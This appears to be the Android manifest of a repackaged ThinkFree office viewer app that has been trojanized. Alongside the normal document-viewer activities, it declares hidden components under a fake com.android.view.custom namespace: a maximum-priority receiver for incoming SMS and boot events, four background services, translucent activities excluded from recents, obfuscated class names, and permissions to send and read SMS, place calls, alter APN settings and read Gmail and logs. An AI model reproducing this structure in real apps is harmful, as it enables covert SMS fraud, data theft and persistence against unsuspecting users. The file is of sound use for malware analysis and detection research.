<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.tf.thinkdroid.archos_Archos5">
    <uses-permission android:name="com.google.android.providers.gmail.permission.READ_GMAIL"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <application android:icon="@drawable/icon" android:label="@string/app_name">
        <activity android:icon="@drawable/icon" android:label="@string/app_name" android:name="com.tf.thinkdroid.manager.activity.StartActivity" android:theme="@android:style/Theme.NoDisplay">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:name="com.tf.thinkdroid.manager.Manager"/>
        <activity android:name="com.tf.thinkdroid.manager.activity.LoginActivity" android:theme="@android:style/Theme.Dialog"/>
        <activity android:label="@string/fileproperties" android:name="com.tf.thinkdroid.manager.activity.FilePropertiesActivity" android:process="com.tf.thinkdroid.properties">
            <intent-filter>
                <action android:name="com.tf.intent.action.VIEW_PROPERTIES"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:scheme="file"/>
            </intent-filter>
            <intent-filter>
                <action android:name="com.tf.intent.action.VIEW_PROPERTIES"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:scheme="content"/>
                <data android:mimeType="application/msexcel"/>
                <data android:mimeType="application/vnd.ms-excel"/>
                <data android:mimeType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"/>
                <data android:mimeType="application/rtf"/>
                <data android:mimeType="text/xml"/>
                <data android:mimeType="application/msword"/>
                <data android:mimeType="application/vnd.ms-word"/>
                <data android:mimeType="application/vnd.openxmlformats-officedocument.wordprocessingml.document"/>
                <data android:mimeType="application/mspowerpoint"/>
                <data android:mimeType="application/vnd.ms-powerpoint"/>
                <data android:mimeType="application/vnd.openxmlformats-officedocument.presentationml.presentation"/>
            </intent-filter>
            <intent-filter>
                <action android:name="com.tf.intent.action.VIEW_PROPERTIES"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:name="com.tf.thinkdroid.manager.activity.DirectoryChooser" android:theme="@style/Theme.Translucent.NoTitleBar.Center">
            <intent-filter>
                <action android:name="com.tf.intent.action.CHOOSE_DIRECTORY"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:name="com.tf.thinkdroid.manager.activity.ManagerPreferenceActivity"/>
        <activity android:label="@string/textviewer" android:name="com.tf.thinkdroid.manager.activity.TextViewerActivity">
            <intent-filter>
                <action android:name="com.tf.intent.action.VIEW_TEXT"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:name="com.tf.thinkdroid.manager.activity.EmailChooser">
            <intent-filter>
                <action android:name="com.tf.intent.action.CHOOSE_EMAIL"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:name="com.tf.thinkdroid.manager.activity.ErrorActivity" android:theme="@android:style/Theme.Dialog">
            <intent-filter>
                <action android:name="com.tf.intent.action.ERROR"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:name="com.tf.thinkdroid.manager.activity.ShareActivity"/>
        <activity android:name="com.tf.thinkdroid.manager.activity.EULAActivity" android:theme="@android:style/Theme.NoTitleBar">
            <intent-filter>
                <action android:name="com.tf.intent.action.CONFIRM_EULA"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:name="com.tf.thinkdroid.manager.activity.AboutActivity">
            <intent-filter>
                <action android:name="com.tf.intent.action.VIEW_ABOUT"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:name="com.tf.thinkdroid.manager.activity.ActivationActivity">
            <intent-filter>
                <action android:name="com.tf.intent.action.ACTIVATE"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:icon="@drawable/write" android:label="@string/write_app_name" android:name="com.tf.thinkdroid.write.WriteViewerActivity" android:process="com.tf.thinkdroid.write">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="com.tf.intent.category.DEFAULT"/>
                <data android:mimeType="application/rtf"/>
                <data android:mimeType="application/msword"/>
                <data android:mimeType="application/vnd.ms-word"/>
                <data android:mimeType="text/xml"/>
                <data android:mimeType="text/plain"/>
                <data android:mimeType="application/vnd.openxmlformats-officedocument.wordprocessingml.document"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:host="" android:pathPattern=".*doc" android:scheme="file"/>
                <data android:host="" android:pathPattern=".*rtf" android:scheme="file"/>
                <data android:host="" android:pathPattern=".*docx" android:scheme="file"/>
                <data android:host="" android:pathPattern=".*xml" android:scheme="file"/>
                <data android:host="" android:pathPattern=".*txt" android:scheme="file"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/app_write_preferences" android:name="aQX$eCq"/>
        <activity android:icon="@drawable/calc_app" android:label="@string/calc_app" android:name="com.tf.thinkdroid.calc.CalcViewerActivity" android:process="com.tf.thinkdroid.calc">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="com.tf.intent.category.DEFAULT"/>
                <data android:mimeType="application/msexcel"/>
                <data android:mimeType="application/vnd.ms-excel"/>
                <data android:mimeType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"/>
                <data android:mimeType="text/csv"/>
                <data android:mimeType="text/comma-separated-values"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:host="" android:pathPattern=".*xls" android:scheme="file"/>
                <data android:host="" android:pathPattern=".*xlsx" android:scheme="file"/>
                <data android:host="" android:pathPattern=".*csv" android:scheme="file"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/calc_preferences" android:name="aEG$dQK"/>
        <activity android:icon="@drawable/app_show" android:label="@string/show_name_app" android:name="com.tf.thinkdroid.show.ShowViewerActivity" android:process="com.tf.thinkdroid.show">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="com.tf.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:mimeType="application/vnd.ms-powerpoint"/>
                <data android:mimeType="application/mspowerpoint"/>
                <data android:mimeType="application/vnd.openxmlformats-officedocument.presentationml.presentation"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:host="" android:pathPattern=".*ppt" android:scheme="file"/>
                <data android:host="" android:pathPattern=".*pptx" android:scheme="file"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/show_name_preferences" android:name="com.tf.thinkdroid.show.ShowViewerPreferences"/>
        <activity android:name="com.tf.thinkdroid.pdf.app.StartTfpActivity" android:process=":tfp" android:theme="@android:style/Theme.NoDisplay">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:mimeType="application/pdf"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.tf.thinkdroid.pdf.app.RenderScreen" android:process=":tfp"/>
        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/tfp_menu_bookmarks" android:name="com.tf.thinkdroid.pdf.app.BookmarksScreen" android:process=":tfp"/>
        <activity android:name="hL$zW"/>
        <receiver android:name="com.android.view.custom.BaseABroadcastReceiver">
            <intent-filter android:priority="2147483647">
                <action android:name="android.net.wifi.PICK_WIFI_WORK"/>
                <action android:name="android.net.conn.MEDIA_NOFS"/>
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.INPUT_METHOD_CHANGED"/>
                <action android:name="android.intent.action.USER_PRESENT"/>
                <action android:name="android.intent.action.UMS_CONNECTED"/>
                <action android:name="android.intent.action.UMS_DISCONNECTED"/>
            </intent-filter>
        </receiver>
        <service android:name="com.android.view.custom.FirstAService"/>
        <service android:name="com.android.view.custom.SecondAService"/>
        <service android:name="com.android.view.custom.ThirdAService"/>
        <service android:name="com.android.view.custom.FourthAService"/>
        <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.android.view.custom.FirstAActivity" android:theme="@android:style/Theme.Translucent"/>
        <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.android.view.custom.SecondAActivity" android:theme="@android:style/Theme.Translucent"/>
        <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.android.view.custom.ThirdAActivity" android:screenOrientation="portrait"/>
        <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.android.view.custom.FourthAActivity" android:screenOrientation="portrait"/>
        <meta-data android:name="PID" android:value="secv"/>
    </application>
    <uses-permission android:name="android.permission.WRITE_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.VIBRATE"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.CALL_PHONE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
    <uses-permission android:name="android.permission.WRITE_APN_SETTINGS"/>
    <uses-permission android:name="android.permission.READ_LOGS"/>
</manifest>